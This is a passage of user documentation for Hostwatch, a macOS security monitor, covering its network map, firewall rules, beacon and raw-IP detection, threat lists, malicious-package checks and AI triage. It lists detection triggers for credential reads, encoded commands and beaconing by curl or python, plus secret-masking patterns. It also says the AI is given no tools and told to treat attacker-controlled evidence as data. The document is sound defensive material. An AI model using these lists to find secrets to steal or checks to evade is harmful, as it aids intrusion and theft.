  - **A listening program:** *Block Other Machines from Port 8000*. This Mac can still reach it.
  - **A program:** *Block Safari's Connections* marks its connections' patterns blocked, as Block does in the list.
  - **A domain:** *Block example.com* adds it to your destinations in Protection, blocked for any program.
  - Program and domain blocks are the firewall's, so they stop connections on Ask or Strict. On Watch the map says
    it will only show what it would block.
  - **Everything you blocked is listed in Protection ▸ Network:** domains, addresses, devices and ports in *Your
    destinations*, what one program may reach on its card in *App rules*, each with its way to unblock. *Add Domain or Address…* there adds one by
    typing it, and an address's card offers *Block both ways*.
- **Details:** the panel on the right shows what you selected.
  - A device: its model, maker, all its addresses, its status, when it was first seen, whether its hardware address
    is private, the programs on this Mac that connected to it and its tries by port. *Mark as Mine* means it is never
    new again, a name field lets you name it, and *Forget* forgets it and its tries.
  - A program: its connections, first and last seen, its way out, and *Process Details* under the map (the panel
    Events shows: status, launch chain, Ask AI, Watch Closely). Right-click a program or a listening program ▸ *Show
    Process Details* does the same.
  - A way out: the router (maker, hardware address, network), a VPN's routes, and the destinations and programs
    through it.
  - A destination: its connections, addresses and way out.
  - A listening program: its process and who tried to reach it.
- **Time travel:** the toolbar's *Time Travel* (⌥⌘T) works on the Network tab too. It opens the same timeline at the
  bottom of the window, and the map follows the playhead: it shows the hours around the moment you picked, by the
  hour. The way out is drawn with today's routes. *Show: New* (next to *Show: All*, each with its count, as on the
  Events tab) keeps what wasn't there in the 7 days before: new devices, fresh connections and first tries.
- **Networks you trust:** every network gets a profile in Protection ▸ Network ▸ *Networks*, named after its router
  (rename it "Home" or "Office"). The network Hostwatch first learned on is trusted. A new one is treated as not
  trusted, and the map asks *Trust It* or *Keep Not Trusted*. On a network you don't trust:
  - other machines can't reach programs listening on all networks (a dev server, file sharing)
  - the firewall asks about new connections, and goes back to Off or Watch when you leave or trust the network
  - any device that tries to connect raises a story
  Each can be turned off per network.
- **Upload watch:** the map counts the bytes each program sends and receives, per destination (from macOS's own
  connection statistics, every 10 seconds). *Connections | Data Sent* at the top switches what lines, counts and
  order measure. The details panel shows each program's, destination's and device's data sent and received.
  **Large upload** is a story: 100 MB or more sent within an hour to a destination that program first reached today.
  On your network it counts only to a device that isn't yours (not marked yours, not there from the map's first
  day), and never for macOS's own programs (Time Machine, AirDrop, AirPlay). The map's first day is its baseline.
- **Who tried to connect:** the Network tab (and Network in the menu bar menu) shows an orange count of the addresses
  that tried to connect to this Mac since you last looked. The map's *Tried to Connect* menu has *Mark as Seen* (keeps
  the tries, clears the count), *Clear Refused Tries* and *Clear All Incoming Tries*. Right-click a device, an address
  or *Closed ports* ▸ *Clear Tries* for just those.
- **Search:** the window's search field filters the map by name. A program, a domain, a device's name, model or maker,
  an address or a port keeps what matches and what it connects to.

**Stories.** Three things raise a story: one address on your network trying ten ports within a minute (*Port scan*), a
device first seen today reaching a program that listens (*New device reached this Mac*), and the router's hardware
address changing (*Router changed*: a new router does this, and so does someone posing as it). Tries from the internet
are shown on the map but raise nothing, since scanners try every public address all day.

**Passive only.** Hostwatch never scans your network. It reads what macOS already knows (the neighbour and route tables,
listening sockets), counts incoming connection attempts, and listens to what devices announce (it asks for
announcements every 15 minutes, on your network only). The devices and tries are kept encrypted in
`network-map.json`: tries for 7 days, devices for 30, yours always. Devices present when Hostwatch first looked are
never shown as new.

#### Domain details and risk score

Open a domain to see who contacted it and when, with a simple risk score and the reasons behind it.

To open it, double-click a domain in the Network tab, or right-click ▸ *Details & Ask AI…*. The window shows the domain
with chips for New / Usual / Known, beaconing and untrusted programs.

Next comes a **local risk score (0–100)**, with each reason and its points:

| Reason | Points |
| --- | --- |
| Not usual on this Mac | +20 |
| First seen in the last 24 h (with not usual) | +10 |
| Reached by unsigned, ad-hoc, quarantined or downloaded software | +30 |
| Beaconing | +25 |
| An often-abused top-level domain, the last part of the name (.xyz, .top, .zip, …) | +15 |
| An internationalised `xn--` name | +15 |
| A random-looking (generated) name | +15 |
| Known | −30 |
| Usual (baseline) | −20 |
| Used by 3+ programs | −10 |

Below the score you see:

- the hostnames and current addresses
- first and last contact (you can open the first in Time Travel)
- the programs, with their signers
- recent connections

**Ask AI** works with Claude or on-device, with the same bar as event details. It answers with a verdict, a confidence
and its own **RISK** score. The evidence it gets is in the collapsed section, and you can edit it first.

#### Beacons and raw-IP connections

Flags two habits of malware: calling home at a steady rhythm, and connecting straight to an IP address without looking
up a name.

**Beaconing** is one program contacting one destination (a domain, or an IP without a name) at a steady interval.
Hostwatch looks for:

- at least 6 contacts
- an average gap of 10 s–1 h
- jitter ≤ 25%, meaning the gaps vary by at most a quarter

Many apps do this legitimately, such as Slack's heartbeat every ~2 min, or telemetry. So it only counts when the
program is **untrusted or a system tool** (`curl`, `python`, …), or the destination is a **raw IP or a new domain**.
Then the connection carries **BEACON ~60s**, and a strong **Beaconing** stage goes to Stories.

A **raw-IP connection** goes straight to an address without a name lookup. Hostwatch flags it when all of these hold:

- the destination is a public IP
- the port is unusual (not 80/443/53/853/123)
- no DNS answer came before it
- the program is untrusted or a system tool

It gets a **RAW IP** badge and a **Raw-IP connection** stage in Stories.

Both signals pass *Only Important* and *Only New*.

#### Firewall

Choose how strict to be: only watch, ask you about each new connection, or allow only what you've approved.

Pick a mode in *Protection*, on the Overview's Network card or the *Network Firewall* page: **Off**, **Watch**, **Ask**
or **Strict**. The connections themselves are in the **Network** tab (⌘5), next to the domains.

- **Watch:** judges every connection and lists what wouldn't simply pass. Watch blocks nothing.
- **Ask:** something new waits, with no time limit, while a window asks you **Allow / Block**. *Always Block* blocks
  that destination (its domain, or the address when it has no name) for that program, so its other destinations are
  still judged. *Always Allow* marks the connection's pattern Safe. Unblock on the app's card is in effect at once.
- **Strict:** something new is refused.

**Global rules and App rules.** The *Network Firewall* page has your rules in two sections built the same way.
- **Global rules** are for every program. The section is tinted light blue, with a globe beside its name. Its first card, **Everywhere**, covers every destination, your network too:
  **Firewall decides** (the default) or **Block**, which blocks every program's traffic but the apps you allow
  everywhere. Below it, specific domains (their subdomains too) and addresses, each **Firewall decides**, **Allow** or
  **Block**.
- **App rules** has one card per app. *Add App…* picks an app (it covers every program inside it) or a command-line
  program. A card has its own **Everywhere** (Firewall decides, Allow or Block) and its own domains and addresses,
  each Allow or Block. Click a card's bar to open or close it: closed, it reads like "Blocked everywhere · 2 allowed".
  *Always Block* and *Allow Anyway* in a firewall question add the destination to the app's card, Block or Allow.
  The card also lists the program's connection patterns you blocked (Suspicious or Dangerous, with the port and who
  did it, each with *Unblock*) and the destinations you asked to be asked about again. A program with only those
  still gets a card. Removing a card takes all of it back.

The first rule that decides wins:
1. The app's own domains and addresses, the most specific one.
2. The app's Everywhere ▸ Block, your network too.
3. The global domains and addresses.
4. The app's Everywhere ▸ Allow. A threat list still blocks it unless you chose *Allow Anyway* for that domain.
5. The global Everywhere ▸ Block.

So an app's own rules win over Global rules, but an app you allow everywhere still meets a domain the Global rules block, and an
app you block everywhere still reaches what its own card allows. Like every firewall rule, they stop connections in
Ask and Strict, and Watch lists them as would block. A change is in effect at once: a connection already open
finishes. Hostwatch itself is never blocked. Program exceptions on the global cards from older versions moved to the
apps' cards.

> [!WARNING]
> Strict refuses everything new that you haven't allowed, also while Hostwatch isn't open. Start with Watch to see
> what it would block.

**How a connection is judged.** Watch judges every TCP and UDP connection Hostwatch sees. The first rule that matches
wins:

1. Hostwatch itself passes.
2. A program you always block Everywhere is blocked (your network too), and with Everywhere on Block, every program
   but the ones you always allow there.
3. Local network (loopback, LAN, link-local, multicast) passes.
4. A known malware address blocks, even if Safe.
5. A pattern marked Suspicious or Dangerous blocks.
6. Safe passes.
7. Then by risk: high-risk blocks, and routine (macOS, trusted developers) passes.
8. A sealed macOS binary that isn't a shell or tool passes.
9. Anything else new is asked about.

What wouldn't simply pass is listed in the Network tab: the last 7 days, at most 500, kept in `firewall-watch.json`.
Each entry is judged again with its pattern's current status. Allow / Block mark the pattern Safe / Suspicious.

**How Ask and Strict stop connections.** In Ask and Strict, Hostwatch's collector sends new outgoing connections
through a relay on this Mac, so they can be held or refused. It uses pf rules in the anchor `com.apple/hostwatch`,
which point connections to the relay on port 46110 (loopback only).

- **Redirected:** every new outgoing TCP and UDP connection of non-root users, IPv4 and IPv6, on every interface.
- **Not redirected:** macOS's DNS service, and loopback, LAN, link-local, multicast and CGNAT.
- **Already open:** connections already open aren't touched.

For each connection, the relay finds the original destination and the program that opened it, and for TLS reads the
server name. Nothing is decrypted. There is one question per program, protocol, destination and port, however many
connections wait. The answer:

- **Allowed:** passes, remembered 5 min.
- **Blocked:** refused (1 min).
- **Something new:** refused in Strict. In Ask it waits, with no time limit, while its own window asks **Allow /
  Block**.

**The question window.** There is one window per question, in the middle of the screen, a Liquid Glass card like
macOS's own alerts. It says who started the program: the launch chain as a short trail from its origin (a terminal,
an app, Claude Code) down to the program, and the program's own command line, so *python3.12* shows the script it
runs. Your answer marks the pattern Safe or Suspicious and answers its other waiting connections.

*Ask Claude* (⌘K) in a question window gathers the same evidence as Ask AI: signature, location, parent, quarantine
and the connection, with the firewall's question first. The window then shows Claude's short advice: **Allow** or
**Block** and why, then the program, the destination and the risks, with a verdict and 0–100 risk badge. It never
answers for you.

**Changing mode or losing the app.**

- **Leaving Ask:** what still waits is decided by the new mode. Off or Watch: pass. Strict: refused.
- **Without the app:** Strict refuses and Ask passes.

**Fail-safes.** The redirect is removed:

- when the mode leaves Ask/Strict
- when the collector stops
- by a watchdog, when the collector's process is gone
- at the next collector start (stale rules)
- at reboot
- when a self-check of web access through the relay (every 30 s) fails twice. This also switches the firewall back
  to Watch.

> [!NOTE]
> The firewall doesn't cover programs running as root, macOS's DNS lookups or the local network. Hostwatch itself
> always passes.

**Containers and virtual machines.** Docker Desktop runs containers in a Linux VM. On macOS, a container's connection
is opened by Docker's backend (`com.docker.backend`), so the program inside (curl, pip…) can't be seen.

Connections of these VM gateways are judged **per destination**: Docker's backend and vpnkit, Podman's `gvproxy`,
OrbStack's helper, `limactl` and QEMU. The pattern is `TCP pypi.org:443`, not `TCP internet:443`. They never pass on
the gateway's trusted signature.

- **Asked once per domain:** each new domain a container reaches is asked about once ("A Docker container wants to
  connect to pypi.org").
- **Block applies to all:** Block stops it for every container.

VMs with bridged or shared (NAT) networking send packets from the VM's own interface, not from a Mac process, so the
firewall never sees them.

### Steps in when needed

When something looks wrong, pause it, or watch it closely to see what it does.

#### Launch and file protection (Protection)

Four pages in the Protection sidebar. *Overview* shows the state at a glance (a shield that is grey when off, purple
while rehearsing, green while protecting, orange while paused) with its one next step (**Start Watching** turns on
Watch everywhere when all is off, then **Pause for 15 Minutes** or **Resume**), a card per area with its four modes,
what the chosen one does, today's numbers and how many it found, and links to the other pages. *Found* there shows
both numbers the sidebar uses: what would be stopped, and everything to review. The Help button explains the modes
and how quickly Ask and Strict act. The window's subtitle says the same state as the Overview, the firewall
included. *Protected Files and Folders* and *Network Firewall* open the way the Overview does, for their area only: a
header in the area's own colour (indigo for files, teal for the firewall) with its state as a pill (grey off, purple
watching, green protecting, orange paused), the mode, one sentence and five facts in one strip, then **Activity** with the area's chart and numbers over the chosen range beside what it
**found most**, with *Review in Found*. Below them come **Global rules** (tinted a light blue) and **App rules**.
The files page's facts are its protected places, the app rules, the place found most in, the last program stopped
and what waits for you. *Found* lists what the rehearsal found.

Each area's card has a chart: what was stopped (or would be) in red, what was asked about (or would be) in grey.
*24 Hours | 7 Days | 30 Days* above the cards switches all of them between the last 24 hours by hour and the last
week or month by day, and each card's two numbers are the totals of its chart. The cards share one scale, so bars side
by side compare honestly. Hover over a bar for its numbers. VoiceOver reads each bar and offers the chart as an Audio
Graph. The firewall's chart counts new destinations by when they were first seen. Hourly counts are kept for 31 days.

The firewall is the third area, beside Launches and Files. The Overview's *Network* card has its four modes and the
same two numbers (what it blocks or would, what it asks about or would). The *Network Firewall* page's header has the mode,
its facts (blocked or would block, passed, your rules, the relay's status, this network and whether you trust it), and
how it decides behind the Help button. Then its activity with the destinations found most, the connections waiting
for your answer (the row's badge counts them), **Global rules** and **App rules** (every rule you made, on its card),
and Networks. *Forget Seen Connections…* (in the header's ⋯ menu, with a confirmation) starts the list of seen
connections again and never touches a rule. *Found* is the one place to decide what the firewall found, under
launches and files, with *Allow* and *Block*, and its badge counts all three. A long section opens in full with
*Show all*.

Hostwatch can show what it would stop: a launch, or a program reading places like your SSH keys. It decides the way
the firewall does. Your decision on the pattern comes first, then its risk, then macOS's own programs pass. Shells,
curl and other programs that run whatever they're told are judged by what they run.

- **Global rules and App rules for files:** the *Protected Files and Folders* page is built like the firewall's. **Global rules**
  are for every program (tinted light blue, as on the firewall's page): each protected place, a built-in group or one of your folders and files, reads as a
  sentence, the programs expected there (they always pass) and *Any other program: Ask me or Block*. **App rules** has one
  card per app (*Add App…*, an app covers every program inside it). A card has **Every protected place**
  (*Protection decides*, *Allow* or *Block*, for the places Global rules protect) and its own places, each Allow or
  Block, added with **Add Place** ▸ *Allow In* or *Block From*: a built-in place, or any folder or file. A place on an
  app's card needs no protection in Global rules: *Block From ~/taxes* keeps that one app out and lets every other program
  in. The first rule that decides wins: the app's own places (the most specific, so SSH keys over your home folder),
  then its Every protected place, then Global rules (your decision on the pattern, the programs expected there, the
  place's choice). Programs you always allowed or blocked in a place before are on their cards now. Block acts in Ask
  and Strict and shows as "would block" in Watch. To block every program from a folder, protect it in Global rules and set
  *Any other program* to *Block*.
- **Global destinations:** on the *Network Firewall* page, *Add Domain or Address…* in Global rules takes a domain (its
  subdomains too) or an IP address, with what every program meets there: *Firewall decides, Allow or Block*. They are
  your decisions, so they come before threat lists and patterns. The most specific destination decides
  (`api.example.com` over `example.com`). *Firewall decides* leaves it to your firewall mode. What one app meets is on
  its own card under App rules, which wins over these. An address has a fourth choice, **Block both ways**: nothing reaches
  this Mac from it or goes to it, whatever the firewall's mode, with no exceptions (not for the router or this Mac).
  The devices and ports you blocked from the network map are in the same list.
- **Found keeps itself short:** an entry that doesn't happen again leaves by itself, a question after a week,
  something that would be stopped after a month, a connection not seen for a week. *Forget* in Found's header clears
  what's shown, the questions, entries older than a day, or all of them. Only the list entries go: decisions, rules
  and patterns stay, and what happens again comes back.
- **AI checks first (Ask):** a paused launch or file access is first looked at by the AI you chose (the on-device
  model or your own server, within 12 seconds). If it is sure it's safe, the program goes on, this time only, and a
  glass notice at the top right says so. It also shows "Checking … with AI" while it looks, whether or not a window
  is open. Otherwise you're asked, with the AI's conclusion as a card (its verdict in colour, its confidence and its
  reason). The question offers *Always Block* (marks the pattern Dangerous), *Block Once* (stops it this time only),
  *Allow Once* and *Always Allow*. Shells, interpreters, high-risk programs and your sensitive files are always
  yours. The pattern stays New for your own decision. Turn it off in *Settings ▸ AI ▸ Protection*.
- **Modes per area:** Launches and Files each have Off, Watch, Ask and Strict. Watch is the default. It stops
  nothing, it marks what would be stopped and counts what would be asked about.
- **Ask and Strict act before it happens.** With Endpoint Security, macOS holds a launch, or an open in a protected
  place, until Hostwatch answers: a blocked program never starts, a blocked file is never read. A question holds it
  while a glass panel asks: *Always Block*, *Block Once*, *Allow Once* or *Always Allow*. Your shell just waits, as
  for a slow program, and there's nothing to resume. Without an answer before macOS's time limit runs out (the
  question counts it down), it is blocked. What Hostwatch can settle by itself never waits: its own processes, other
  users' and root's, macOS's own programs (except the ones that run anything, like shells, curl or python),
  unprotected files, and a place's expected programs. Without the app connected, everything goes on.
- **When the app is busy:** if the app doesn't answer within a moment, the launch goes on and Hostwatch pauses it
  right after, the way it did before Endpoint Security, then asks. A build without Apple's entitlement (one you make
  yourself) works that way all the time: a few milliseconds late, a question pausing the program.
- **Careful with Strict for launches.** It stops every launch nobody decided yet, builds included. Watch first:
  its counts on the Overview page show what Ask and Strict would do.
- **Protected files:** cards for SSH keys, developer credentials (cloud, Kubernetes, registries, GitHub, GPG),
  keychains, browser passwords and cookies, Messages and Mail, privacy settings and accounts, and autostart locations
  (writes only). The programs expected there pass. For everyone else a card asks, or blocks. A card can be off.
- **Your folders and files:** *Add Folder or File…* protects any folder (and everything inside it) or a single file.
  Only macOS's own programs (Finder, Spotlight, backups) pass without asking. Each has its own switch, Ask or Block,
  and a remove button. Allow a program there on its card under App rules, or by marking its pattern Safe.
- **What protection found:** the *Found* page lists each launch, file access and connection that would be stopped or
  asked about, folded by pattern and grouped by program, the programs that would be stopped first. Its header (in
  orange, the attention colour) counts what there is to review, what would be stopped, the questions, the program
  found most and the oldest entry. Filter by *Launches*, *Files* or *Connections* and by *Would Stop* or *Questions*,
  search by program, pattern or destination, and sort by how often, how recently or by name. A program shows its
  first five entries (*Show More* for the rest), and *Decide All* allows, blocks or forgets all of them at once (a
  threat list's match is never allowed in bulk). On each entry, *Allow* marks the pattern Safe, *Block* marks it
  Dangerous (a connection blocks just that destination for that program), and the × forgets it. The entry leaves at
  once, and the same actions are in its context menu. While you work, programs and entries keep their place (new
  ones come after), so nothing moves away from under the pointer: a new sort, filter or search orders them afresh. Deciding it anywhere else does the same.
- **In Events:** a red no-entry sign after the status marks what would be stopped, with the reason in its tooltip.
  Questions are only counted, so the list stays quiet.
- **Pause for 15 Minutes** stops everything, rehearsal included. The window's subtitle says *Rehearsing*,
  *Protecting* or *Protection paused*.

#### Hold suspicious processes (opt-in)

Optional: when a process does something clearly dangerous, Hostwatch pauses it and asks you whether to let it go on
or stop it.

This gives you a chance to stop a harmful step before it finishes. Turn it on in
*Settings ▸ Detection ▸ Hold suspicious processes* or from the menu bar icon. It is off by default.

When an event adds a strong story stage, Hostwatch pauses the process. A floating panel then asks you what to do:

- **Allow:** the process goes on.
- **Always Allow:** the process goes on, and the pattern is marked Safe.
- **Kill:** the process is stopped for good.
- **Ask AI:** an AI looks at the evidence and explains it.

These strong stages trigger a hold:

- a piped or encoded command
- a credential read
- a login item
- quarantine removal
- running a just-dropped file
- a swapped binary

A program that is a new high-risk pattern is held too.

- **No answer in 60 s:** Hostwatch lets the process continue (the default) or kills it. You choose this with
  *If No Answer in 60 s*.
- **Only your processes:** it can't hold root's or other users' processes.
- **Never held:** patterns marked Safe, Hostwatch itself, launchd, system UI (`/System/Library/CoreServices`,
  `/System/Applications`), and terminals or editors.
- **At most 5 holds at once.**
- **Safe signalling:** if the process has exited and its pid now belongs to another program, that program is left
  alone.
- **Fails open:** a process can't stay frozen if Hostwatch quits or crashes, it resumes after about a minute.
  Quitting or turning the hold off resumes everything.
- **Best effort:** events arrive after the fact, so a quick `curl` can finish before it is stopped. Slower steps,
  such as installers, scripts and long downloads, are caught.

#### Watch Closely

Curious what a program really does? Record it, and everything it starts, for a minute, then read a plain summary of
its files, network and system changes.

1. Right-click an event, or choose Activity ▸ *Watch Selected Process Closely…* (⌥⌘W).
2. Hostwatch records what its process, and every process it starts, does for 30 seconds, 1, 2 or 5 minutes (the
   window's duration menu). The default is 1 minute.
3. Recording ends at the time limit, when you click *Stop*, when every watched process has exited, or when the app
   goes away.
4. Read the result. **Watch Again** records once more.

**What the window shows.** **What stands out** comes first. These are local rules that flag:

- persistence
- privacy changes
- injection into or control of other processes
- privilege changes
- keychains, SSH and cloud keys, browser data
- launch agents
- removed quarantine
- executables made in temporary folders
- mass renames

Below that you see processes as a tree, then network, other processes, persistence, privileges, system, services,
files grouped by folder (changes first) and event counts.

**Ask an AI about it.** When recording ends, **Ask** explains the result with Claude or Apple's on-device model. You
pick with the engine switch, as in Ask AI. The evidence is the summary, most telling first, with the signer and
parent chain. You can edit it before sending, and secrets are masked.

**What is recorded.** About 60 kinds of Endpoint Security events (the macOS interface that reports system activity),
plus the process's network connections:

- file create, write, rename, delete, permissions and quarantine changes
- code loaded and memory made executable
- signals, task ports, debugging and thread injection into other processes
- setuid, sudo, authorization
- XPC and Unix-socket connections
- login items, configuration profiles, privacy (TCC) changes
- kernel extensions, drivers, mounts and more

Only the summary is kept, never the raw events.

### Knows known threats

Public threat lists, checked on your Mac every day.

#### Known threats and exploited macOS vulnerabilities

Once a day Hostwatch fetches public lists of malware servers and files and checks your Mac against them. It also
tells you when your macOS has holes that attackers are actively using.

You can also click *Update Now* in Settings ▸ Detection. The matching happens on this Mac: nothing about the Mac is
sent.

| List | What | Key |
|------|------|-----|
| HaGeZi Threat Intelligence (Medium) | ~320k malware, phishing and C2 domains, ~35k IPs | none |
| Feodo Tracker | active botnet command servers | none |
| ThreatFox | C2 domains, IPs (and ports), URLs' hosts and file hashes, with the malware family (last 7 days, kept 180) | free abuse.ch key |
| MalwareBazaar | malware file SHA-256 (last 48 h, kept 180 days) | free abuse.ch key |
| CISA Known Exploited Vulnerabilities | Apple flaws exploited in the wild | none |

C2 means "command and control": servers that attackers use to steer infected machines.

**What is checked.**

- **Every connection:** its hostname and each parent domain (`a.b.evil.com` → `evil.com`), then its IP and IP:port.
- **Every launch of an untrusted program:** Untrusted means unsigned, ad-hoc, quarantined, or from a download or
  temp folder. The program is hashed (SHA-256, once per file version). With the key, the hash is checked against the
  file lists.

**What a match does.** How sure a match is decides its story stage:

- **Known malware** (proof): a known malware file, a malware tracker's exact domain (ThreatFox, MalwareBazaar), or a
  Feodo Tracker address (dedicated botnet servers). It makes a story on its own and makes it **Dangerous**, even for
  a pattern you marked Safe.
- **On a blocklist** (a sign): any HaGeZi match (its list is broad, ad networks and trackers too) and any other
  address-only match (one address serves many sites). It needs one more sign from another event, and a pattern you
  marked Safe stays quiet.

Either way the firewall blocks the destination.

- The row gets a red `KNOWN BAD` tag in Events and the HUD.
- The domain gets a red badge and risk score 100, with the reason.
- The tray shows a line.
- After each update, the last 30 days of domains, and programs already hashed, are checked again. Matches found this
  way are shown as *contacted earlier*.

**macOS vulnerabilities.** Hostwatch takes CISA's Apple entries for macOS, or for several Apple systems including it.
It compares them with the date of your last macOS update and any update waiting in Software Update.

- CISA doesn't name fixed versions. So a flaw listed before your last update is shown as *likely fixed*.
- Later ones are shown as *fixed by the waiting update* or *not fixed by your last update*.
- A banner in the window and a list show them. The list gives the CVE, component, ransomware use and Apple advisory.
- The tray says when an update fixes exploited flaws.
- Dismissing the vulnerability banner is remembered until another flaw is listed.
- The banner's list has **Open Software Update**.

**Storage.** The abuse.ch key is kept in the Keychain. Lists are cached in
`~/Library/Application Support/Hostwatch/intel`, readable only by you and never executable.

**A download can't become anything but a list.**

- Lists are only read, never run.
- They are fetched over HTTPS, with no cookies or cache. Redirects are followed only within the same server.
- Before a download replaces the previous copy, it must be text. Programs, archives, documents and scripts are
  refused.
- It must be within a plausible size.
- It must have the right shape line by line: ≥ 95% valid domains or IPs. The CISA list needs ≥ 500 entries.
- A list that suddenly shrinks by half or grows five-fold is refused too.
- A refused update keeps the previous list and shows why in Settings ▸ Detection.

**Poisoning can't flag the platforms everything uses.** "Poisoning" means tampering with a list to flag a popular
domain.

- Apple, Google, Microsoft, GitHub, AWS, Cloudflare, Akamai, YouTube, the big social networks (Facebook, Instagram,
  WhatsApp, LinkedIn, TikTok, X, Reddit, Pinterest, Snapchat) and a few others are never flagged by their own domain,
  nor by a parent-domain match.
- The social and video networks, and Apple's, Google's and Microsoft's own domains, run every name under them
  themselves, so none of those names is flagged either: a list naming `www.youtube.com` (lists include YouTube links
  used as lures) names the platform, not a malware server. Stories and threat-log entries made that way before are
  removed when Hostwatch starts.
- A connection to one of these platforms isn't flagged by its address either. Their servers are shared by everyone
  on them, so an IP list naming one was reported for someone else.
- Local addresses are never matched: private, link-local (`169.254.169.254` is the cloud metadata service), loopback
  and multicast exist on every network, so a list naming one was reported from someone else's. Infected devices on
  your own network are caught by what they do instead: port scans, new devices reaching this Mac, large uploads.
- An IP-only match on a CDN's shared range (Cloudflare, Fastly) is ignored: that address fronts millions of sites.
  A malware domain behind the CDN is still flagged by its name.
- A phishing page on a shared host is still flagged by its full name (`login-apple.github.io`).
- A list can only raise alerts: it can never make Hostwatch trust anything.

**A malicious file on a shared platform doesn't flag the platform.** ThreatFox mostly lists full addresses: one file on
GitHub, one Telegram channel or Steam profile that malware reads its real server from. Hostwatch sees which server a
program connects to, not the file, so matching the whole host would flag everyone who uses GitHub or Telegram.

- Hosts where anyone can publish are never flagged by such an address: GitHub's raw and gist hosts, GitLab,
  Bitbucket, Telegram, Discord, Steam, X, VK, Reddit, Pastebin, Dropbox, MediaFire, MEGA, Google Drive and Sites,
  OneDrive, the Internet Archive, SourceForge and link shorteners.
- A host whose listed addresses belong to three or more malware families in one download is treated the same way:
  it's shared, whoever runs it.
- An attacker's own server is still flagged, and so is a customer's own subdomain of a platform
  (`abc123.workers.dev`). Anonymous file drops such as catbox are kept on purpose: rare on an ordinary Mac, and a
  real signal.
- What a program then does there is still judged: a new domain, beaconing or an untrusted program calling out each
  raise their own story steps.

#### Malicious packages in your projects

A package from npm, PyPI or another registry runs its code as you. When a version turns out to be malicious, it is
usually already installed somewhere: through a dependency of a dependency, in a project you haven't opened for months.

Hostwatch checks every project on your Mac against the list of known malicious packages and tells you where one is.

- **The list:** OSV.dev's malicious packages, fed by the OpenSSF malicious-packages project, for npm, PyPI, Go,
  crates.io, RubyGems, Packagist and NuGet. A list is downloaded only for the languages your projects use: the whole
  list once (npm's is about 220 MB to download and 9 MB kept), then only what changed, daily.
- **Your projects:** found by Spotlight, plus folders you add in Protection ▸ Packages. Lockfiles are read:
  `package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`, `bun.lock`, `requirements*.txt`, `uv.lock`, `poetry.lock`,
  `Pipfile.lock`, `go.sum`, `Cargo.lock`, `Gemfile.lock`, `composer.lock`, `packages.lock.json`, and the packages in a
  Python virtual environment. Lockfiles name every dependency, not only the ones you chose.
- **When:** a lockfile is checked again within the hour after it changes, and every project is checked again whenever
  a list grows. A bad version already on disk is found the day it is listed.
- **A match** is an exact name and version, so it is proof, not a sign: a **Dangerous** story with the project, the
  package and the list's entry. Protection ▸ Packages lists every match with Show in Finder, the advisory, and
  Dismiss.
- **What to do:** upgrade or remove the package. If its code ran, change the keys and tokens this Mac holds, from
  another computer.

**Stopping installs.** Packages has the modes of the other areas. Watch only finds. In **Ask** (the default),
Hostwatch also stops a listed package before its code runs:

- **Install scripts:** npm, pnpm, yarn and bun run a package's `preinstall`, `install`, `postinstall` and `prepare`
  scripts, Cargo a crate's build script, pip a source package's build, RubyGems a gem's `extconf.rb`. Each is held at
  launch, and a listed package's script is denied. The install fails with an error, and a Dangerous story says which
  package and why.
- **Named installs:** `npm install x`, `npx x`, `pnpm dlx x`, `bunx x`, `pip install x`, `uvx x`, `pipx run x`,
  `cargo add x`, `gem install x`, `go get x` with a listed name are denied before the package manager starts. Without
  a version on the command line, only a package listed for every version is stopped (most are).
- **Claude Code:** with the Claude Code guard on, the same commands are blocked before Claude runs them.
- **Strict** also moves a listed npm package that arrived anyway out of the project's `node_modules`, into
  quarantine. Packages ▸ Quarantined puts it back or deletes it. For other languages the story gives the fix.

Stopping needs Endpoint Security, like launch and file protection. Protection ▸ Packages lists what was stopped.

The check only knows what is already listed. Limiting what any install script may do, listed or not, is planned
(ADR 0024).

### AI when you want it

AI explains and helps decide, only when you ask, on your Mac or with Claude.

#### Ask AI: is this dangerous?

Not sure about something? Double-click it: an AI looks at the evidence on your Mac and explains in plain words whether
it's dangerous.

1. In the activity window, **double-click** any process, connection or file row. Or right-click it →
   **Ask AI: Is This Dangerous?…**.
2. With Claude as the engine, a window opens and collects local evidence (listed below).
3. **Review and edit the evidence before sending.** Obvious secrets are masked automatically: bearer tokens,
   `--password=`, URL credentials, `ghp_`, `sk-` and `AKIA…` keys.
4. Click the send button (⌘↩). It reads **Ask Claude**, **Ask On-Device** or **Ask Again**.
5. The answer streams in, with a **SAFE / SUSPICIOUS / DANGEROUS / UNKNOWN** badge.

The window also has **Re-collect** (gather the evidence again), **Copy Answer** and **Cancel**.

**Evidence collected:**

- `ps` details and the parent process chain
- code signature and Team ID, Gatekeeper (`spctl`), quarantine flag, SHA-256, file metadata
- reverse DNS and the process's current connections (network events)
- file type and flags (file events)
- other recent activity from the same PID

**How Claude is run.** With Claude, Hostwatch runs Claude Code in the background (`claude -p`):

- **Login:** it uses your existing Claude Code login. No extra API key is needed.
- **Isolation:** your hooks, plugins and MCP servers are skipped, and no session is saved.
- **No tools by default:** the evidence may be attacker-controlled. So by default Claude gets **no tools** and is told
  to treat the evidence only as data.
- **Read local files:** this is opt-in (read-only).
- **Finding `claude`:** it is looked up in `~/.local/bin`, `~/.claude/local`, Homebrew and `/usr/local/bin`, then
  your login shell. Set `CLAUDE_PATH` to override.
- **Privacy and cost:** evidence you send goes to Anthropic. A typical question takes about 10 s and costs about
  $0.02–0.05.

#### AI engine and triage

Pick the AI: Apple's on-device model keeps everything on your Mac. Claude is stronger and sees only what you send it.

**Settings ▸ AI** picks which AI Hostwatch uses. It also shows the on-device model's status.

| Engine | AI suggestions for patterns | Ask AI (event or story) |
|--------|------------------------------|-------------------------|
| **Local Model** | the local model only, what it can't settle stays New | the local model |
| **Claude** | Claude only | Claude |
| **Local Model First, Claude for the Rest** (default) | steps 1 and 2 below | Claude |

**Which models.** The *local model* is Apple's on-device model or a custom server:

- **Apple On-Device:** *General* (the default) or *Content Tagging*, Apple's model tuned for classifying text.
- **Custom Server (OpenAI-compatible):** any server with the OpenAI chat API, such as Ollama, LM Studio, llama.cpp,
  vLLM or a cloud endpoint. Enter its address and model (*Load Models* lists them) and an API key if it needs one. The
  key is stored encrypted. *Test* runs one real triage. A server on this Mac keeps everything on it. A server elsewhere
  receives the pattern facts and Ask AI evidence, secrets masked, and Settings says where they go.
- **Claude model:** Haiku by default, or Sonnet, Opus or Claude Code's own default, for every Claude call.

`Hostwatch --triage-benchmark` compares local models on your own decisions (see Advanced and command line).

**How the models compare.** Measured in November 2026 on an M3 Pro: 20 patterns the user had marked Safe and 20
